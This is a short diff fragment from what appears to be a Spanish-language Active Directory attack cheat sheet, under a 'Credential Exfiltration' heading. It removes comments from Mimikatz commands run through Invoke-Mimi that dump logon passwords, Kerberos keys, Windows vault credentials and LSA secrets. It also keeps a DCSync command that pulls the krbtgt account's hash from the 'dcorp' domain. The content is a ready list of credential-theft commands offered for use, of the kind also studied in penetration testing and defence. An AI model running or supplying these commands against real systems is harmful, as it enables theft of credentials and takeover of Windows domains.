@@ -162,10 +162,10 @@ net localgroup "Administrators"
 ## ![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&duration=6000&pause=1000&width=435&lines=Credential+Exfiltration)
 
 ```Powershell
-Invoke-Mimi -Command "sekurlsa::logonpasswords"                     (Te da la mayoria de NTLM)
-Invoke-Mimi -Command '"sekurlsa::ekeys"'                                (Dumpear)
-Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'        (Sacar Vault)
-Invoke-Mimi -Command '"lsadump::lsa /patch"'                        (Sacar NTLM solo Administrator)
+Invoke-Mimi -Command "sekurlsa::logonpasswords"                     
+Invoke-Mimi -Command '"sekurlsa::ekeys"'                            
+Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'        
+Invoke-Mimi -Command '"lsadump::lsa /patch"'                       
 ---DCSYNC
 Invoke-Mimi -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 --Entre dominios
